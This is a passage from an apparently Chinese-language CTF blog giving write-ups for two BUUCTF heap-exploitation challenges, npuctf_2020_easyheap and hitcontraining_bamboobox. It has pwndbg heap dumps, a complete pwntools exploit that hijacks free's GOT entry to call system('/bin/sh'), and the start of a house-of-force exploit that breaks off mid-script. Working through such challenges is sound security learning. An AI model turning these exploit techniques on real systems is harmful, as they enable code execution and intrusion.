<h4 id="4-释放chunk1"><a href="#4-释放chunk1" class="headerlink" title="4.释放chunk1"></a>4.释放chunk1</h4><blockquote>
<p>chunk1通过上面的全局变量，找到的地址还是不变，但是大小以及被修改为0x41，会按照0x41的大小被释放</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x21d9290</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d92d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x21d9250</span><br><span class="line">0x21d9250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d9260:	0x0000000000000018	0x00000000021d9280</span><br><span class="line">0x21d9270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d9280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0x21d9290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x21d92a0:	0x0000000000000000	0x00000000021d9010	#释放</span><br><span class="line">0x21d92b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d92c0:	0x0000000000000000	0x00000000021d9010	#释放</span><br><span class="line">0x21d92d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x21d92e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x21d92f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0</span><br><span class="line">0x6020a0 &lt;heaparray&gt;:	0x00000000021d9260	0x0000000000000000		#另一个被清零了</span><br><span class="line">0x6020b0 &lt;heaparray+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="5-重新申请0x38的块"><a href="#5-重新申请0x38的块" class="headerlink" title="5.重新申请0x38的块"></a>5.重新申请0x38的块</h4><blockquote>
<p>再次申请，会把之前释放的0x41和0x21重新申请回来。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">#找不到下一个，，，但是在</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf02d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<h4 id="6-通过0x41的块，溢出覆盖0x21的块"><a href="#6-通过0x41的块，溢出覆盖0x21的块" class="headerlink" title="6.通过0x41的块，溢出覆盖0x21的块"></a>6.通过0x41的块，溢出覆盖0x21的块</h4><blockquote>
<p>但是由于0x41的chunk与0x21的chunk重叠了，故可以通过0x41的chunk修改0x21的chunk</p>
<p>但是0x21的chunk存放的是chunk1的指针，故可以让chunk1指针指向free got表，达到泄露。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xbf0250</span><br><span class="line">0xbf0250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbf0260:	0x0000000000000018	0x0000000000bf0280</span><br><span class="line">0xbf0270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbf0280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0xbf0290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xbf02a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbf02b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbf02c0:	0x0000000000000038	0x0000000000602018#free_got</span><br><span class="line">0xbf02d0:	0x000000000000000a	0x0000000000020d31</span><br><span class="line">0xbf02e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xbf02f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x15d bytes:</span><br><span class="line">    00000000  53 69 7a 65  20 3a 20 35  36 0a 43 6f  6e 74 65 6e  │Size│ : 5│6·Co│nten│</span><br><span class="line">    00000010  74 20 3a 20  30 ba fd 89  0a 7f 0a 44  6f 6e 65 21  │t : │0···│···D│one!│</span><br><span class="line">    #泄露到了free的地址</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)</span><br></pre></td></tr></table></figure>
<h4 id="7-修改free-got表为system地址"><a href="#7-修改free-got表为system地址" class="headerlink" title="7.修改free_got表为system地址"></a>7.修改free_got表为system地址</h4><blockquote>
<p>此时chunk1的指针指向free_got，故修改chunk1的内容，就可以修改free_got表内容，修改为system地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb92d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xbb9250</span><br><span class="line">0xbb9250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbb9260:	0x0000000000000018	0x0000000000bb9280</span><br><span class="line">0xbb9270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbb9280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0xbb9290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xbb92a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbb92b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbb92c0:	0x0000000000000038	0x0000000000602018#chunk1指针-&gt;free_got-&gt;system</span><br><span class="line">0xbb92d0:	0x000000000000000a	0x0000000000020d31</span><br><span class="line">0xbb92e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xbb92f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018:	0x00007fcb5dae9550	0x000000000040060a</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fcb5dae9550</span><br><span class="line">0x7fcb5dae9550 &lt;__libc_system&gt;:	0xfa66e90b74ff8548	0x0000441f0f66ffff</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./npuctf_2020_easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29535</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./npuctf_2020_easyheap"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.27.so")</span></span><br><span class="line"><span class="comment"># p = process(['./npuctf_2020_easyheap'],env=&#123;"LD_PRELOAD":"./libc-2.27.so"&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"only) :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x38</span>) + p64(free_got)</span><br><span class="line">create(<span class="number">0x38</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h3><p>特点：</p>
<ol>
<li>可以修改got表</li>
<li>malloc两次：一个node，一个content</li>
</ol>
<p>方法：</p>
<ol>
<li>利用node和本体互换 =&gt; 泄露libc</li>
<li>修改free_got=&gt;system</li>
</ol>
<blockquote>
<p>off by one题挺多，多练习，this is the first。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/24/21-36/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/24/21-36/" class="post-title-link" itemprop="url">hitcontraining_bamboobox</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-24 21:36:41 / 修改时间：21:42:53" itemprop="dateCreated datePublished" datetime="2021-04-24T21:36:41+08:00">2021-04-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>hitcontraining_bamboobox这道题有两种解题方式：</p>
<ol>
<li><p>house of force</p>
<p>参考：<a href="https://paper.seebug.org/521/#house-of-force" target="_blank" rel="noopener">house of force</a></p>
</li>
<li><p>unlink</p>
</li>
</ol>
</blockquote>
<h2 id="house-of-force（详解）"><a href="#house-of-force（详解）" class="headerlink" title="house of force（详解）"></a>house of force（详解）</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p>只要top chunk size够大，就能随意申请chunk</p>
<p>所以，如果有溢出能控制top chunk size，就可以修改其为-1（0xffffffff最大值），然后malloc(负数)可以向上申请，malloc(正数)</p>
</blockquote>
<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><p>程序一开始申请0x10的块，存放hello_message和goodbye_message的指针，而且最后在功能5中会调用goodbye_message。</p>
<p><img src="/2021/04/24/21-36/image-20210424211521894.png" alt="image-20210424211521894"></p>
<p><img src="/2021/04/24/21-36/image-20210424211735644.png" alt="image-20210424211735644"></p>
<p>所以，可以通过house of force修改top chunk size，然后将top chunk申请到v3里，修改v3的指针为后门函数magic的地址，然后即可get flag。</p>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-申请一个chunk"><a href="#1-申请一个chunk" class="headerlink" title="1.申请一个chunk"></a>1.申请一个chunk</h4><blockquote>
<p>为了不跟v3的大小0x10撞，选择0x30的大小。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89060</span><br><span class="line">Size: 0x20fa1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1a89000</span><br><span class="line">0x1a89000:	0x0000000000000000	0x0000000000000021#v3</span><br><span class="line">0x1a89010:	0x0000000000400896	0x00000000004008b1#hello_message、goodbye_message</span><br><span class="line">0x1a89020:	0x0000000000000000	0x0000000000000041#申请的chunk</span><br><span class="line">0x1a89030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x1a89040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89060:	0x0000000000000000	0x0000000000020fa1#top chunk size</span><br><span class="line">0x1a89070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h3 id="2-堆溢出修改top-chunk"><a href="#2-堆溢出修改top-chunk" class="headerlink" title="2.堆溢出修改top chunk"></a>2.堆溢出修改top chunk</h3><p>手动输入新top chunk为最大值0xffffffffffffffff（本质就是-1，但好像直接-1不太好使，，，）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xc32000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xc32020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0xc32060</span><br><span class="line">Size: 0x-1	#成功修改为-1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xc32000</span><br><span class="line">0xc32000:	0x0000000000000000	0x0000000000000021	#v3（目的地址）</span><br><span class="line">0xc32010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0xc32020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xc32030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32060:	0x0000000000000000	0xffffffffffffffff	#chunk</span><br><span class="line">0xc32070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-向上申请到v3的地址"><a href="#3-向上申请到v3的地址" class="headerlink" title="3.向上申请到v3的地址"></a>3.向上申请到v3的地址</h4><p>向上申请块，需要malloc(负数)，负数 =  0xc32000 - 0xc32060 - 0x10 = -0x70（-112）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xeae000	#成功修改chunk的位置</span><br><span class="line">Size: 0x59</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xeae000</span><br><span class="line">0xeae000:	0x0000000000000000	0x0000000000000059#目的地址</span><br><span class="line">0xeae010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0xeae020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xeae030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae060:	0x0000000000000000	0x00ffffffffffffa1</span><br><span class="line">0xeae070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-申请一个块，填入内容magic"><a href="#4-申请一个块，填入内容magic" class="headerlink" title="4.申请一个块，填入内容magic"></a>4.申请一个块，填入内容magic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x2034000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x2034020</span><br><span class="line">Size: 0x39</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x2034000</span><br><span class="line">0x2034000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x2034010:	0x0000000000400d49	0x0000000000400d49	#修改成功</span><br><span class="line">0x2034020:	0x0000000000000000	0x0000000000000039</span><br><span class="line">0x2034030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034060:	0x0000000000000000	0x00ffffffffffffa1</span><br><span class="line">0x2034070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="执行功能5"><a href="#执行功能5" class="headerlink" title="执行功能5"></a>执行功能5</h4><p>也就是会<code>v3[1]()</code>,v3[1]的地址已经被修改为magic的地址，故将执行后门函数magic()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xe bytes:</span><br><span class="line">    &#39;flag&#123;good_job&#125;&#39;</span><br><span class="line">flag&#123;good_job&#125;[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span 